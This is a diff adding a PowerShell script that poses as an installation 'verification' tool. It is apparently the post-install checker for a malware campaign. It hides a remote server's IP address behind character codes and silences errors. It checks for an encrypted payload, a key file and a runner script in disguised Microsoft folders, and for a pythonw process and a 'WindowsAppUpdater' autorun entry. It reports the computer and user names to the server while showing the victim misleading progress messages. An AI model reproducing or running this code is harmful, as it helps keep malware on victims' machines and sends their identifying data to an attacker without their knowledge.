@@ -1,0 +1,186 @@
+$ErrorActionPreference = 'SilentlyContinue'
+
+$sUrl = 'http://' + [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+[char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':3000'
+
+$pDir = "$env:APPDATA\Microsoft\Security"
+$kDir = "$env:LOCALAPPDATA\Microsoft\Vault"
+$rDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
+$pFile = "$pDir\payload.enc"
+$kFile = "$kDir\.token"
+$rFile = "$rDir\updater.ps1"
+
+$pName = "pythonw"
+$aName = "WindowsAppUpdater"
+
+$mId = [System.BitConverter]::ToString(
+    [System.Security.Cryptography.MD5]::Create().ComputeHash(
+        [System.Text.Encoding]::UTF8.GetBytes("$($env:COMPUTERNAME.ToLower())-$($env:USERNAME.ToLower())")
+    )
+).Replace('-','').Substring(0,16).ToLower()
+
+function sLog {
+    param([string]$t,[string]$m,[hashtable]$e = @{})
+    try {
+        $l = @{
+            timestamp = (Get-Date).ToString("o")
+            type = $t
+            message = $m
+            odId = $mId
+            pcName = $env:COMPUTERNAME
+            pcUser = $env:USERNAME
+            steamId = ""
+            username = ""
+            stage = "check"
+        }
+        if ($e.Count -gt 0) { $l.extra = $e }
+        $j = $l | ConvertTo-Json -Compress
+        $w = New-Object Net.WebClient
+        $w.Headers.Add("Content-Type", "application/json")
+        $null = $w.UploadString("$sUrl/api/log", $j)
+    } catch {}
+}
+
+function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -e $e }
+function lAct { param($m, $e = @{}) sLog -t "actions" -m $m -e $e }
+function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -e $e }
+
+function tFile {
+    param([string]$p, [string]$n)
+    if (Test-Path $p) {
+        $s = (Get-Item $p).Length
+        lAct "$n exists" @{ path = $p; size = $s }
+        return $true
+    } else {
+        lErr "$n missing" @{ expectedPath = $p }
+        return $false
+    }
+}
+
+function tProc {
+    param([string]$pn)
+    $pr = Get-Process $pn -ErrorAction SilentlyContinue
+    if ($pr) {
+        $c = ($pr | Measure-Object).Count
+        $pi = @()
+        foreach ($p in $pr) {
+            $pi += @{ pid = $p.Id; startTime = $p.StartTime.ToString("o") }
+        }
+        lAct "$pn process running" @{ count = $c; processes = $pi }
+        return $true
+    } else {
+        lErr "$pn process not found"
+        return $false
+    }
+}
+
+function tRun {
+    param([string]$n)
+    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    try {
+        $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
+        if ($v.$n) {
+            lAct "Autorun configured" @{ name = $n; command = $v.$n }
+            return $true
+        }
+    } catch {
+        lErr "Autorun missing" @{ expectedName = $n }
+        return $false
+    }
+}
+
+function tPy {
+    $vs = @('311','312','310','313','39')
+    $f = $false
+    foreach ($v in $vs) {
+        $pp = "$env:LOCALAPPDATA\Programs\Python\Python$v\pythonw.exe"
+        if (Test-Path $pp) {
+            lAct "Python installed" @{ version = $v; path = $pp }
+            $f = $true
+            break
+        }
+    }
+    if (-not $f) {
+        lErr "Python not installed"
+        return $false
+    }
+    return $true
+}
+
+function chk {
+    Clear-Host
+    Write-Host ""
+    Write-Host "  Processing verification..." -ForegroundColor Cyan
+    Write-Host ""
+    
+    lInfo "Installation check started" @{
+        machineId = $mId
+        pcName = $env:COMPUTERNAME
+        pcUser = $env:USERNAME
+    }
+    
+    $r = @{
+        pf = $false
+        kf = $false
+        rf = $false
+        py = $false
+        pr = $false
+        ar = $false
+    }
+    
+    Write-Host "  [*] Checking optimization..." -ForegroundColor Yellow
+    Start-Sleep -Milliseconds 500
+    
+    $r.pf = tFile -p $pFile -n "Payload file"
+    $r.kf = tFile -p $kFile -n "Encryption key"
+    $r.rf = tFile -p $rFile -n "Runner script"
+    $r.py = tPy
+    $r.pr = tProc -pn $pName
+    $r.ar = tRun -n $aName
+    
+    Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
+    Start-Sleep -Milliseconds 800
+    
+    $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
+    $tc = $r.Count
+    $pp = [math]::Round(($pc / $tc) * 100, 0)
+    
+    Write-Host ""
+    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
+    Write-Host ""
+    
+    if ($pc -eq $tc) {
+        Write-Host "  [✓] Verification complete: $pc/$tc ($pp%)" -ForegroundColor Green
+        lAct "Installation check completed" @{
+            passed = $pc
+            total = $tc
+            percentage = $pp
+            allPassed = $true
+        }
+    } elseif ($pc -ge 4) {
+        Write-Host "  [!] Verification complete: $pc/$tc ($pp%)" -ForegroundColor Yellow
+        Write-Host "  [!] Restart required for full functionality" -ForegroundColor Yellow
+        lInfo "Installation check completed with warnings" @{
+            passed = $pc
+            total = $tc
+            percentage = $pp
+            allPassed = $false
+        }
+    } else {
+        Write-Host "  [✗] Verification failed: $pc/$tc ($pp%)" -ForegroundColor Red
+        Write-Host "  [!] Please reinstall" -ForegroundColor Red
+        lErr "Installation check failed" @{
+            passed = $pc
+            total = $tc
+            percentage = $pp
+            allPassed = $false
+        }
+    }
+    
+    Write-Host ""
+    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
+    Write-Host ""
+    Write-Host "  Press any key to exit..." -ForegroundColor Gray
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+}
+
+chk
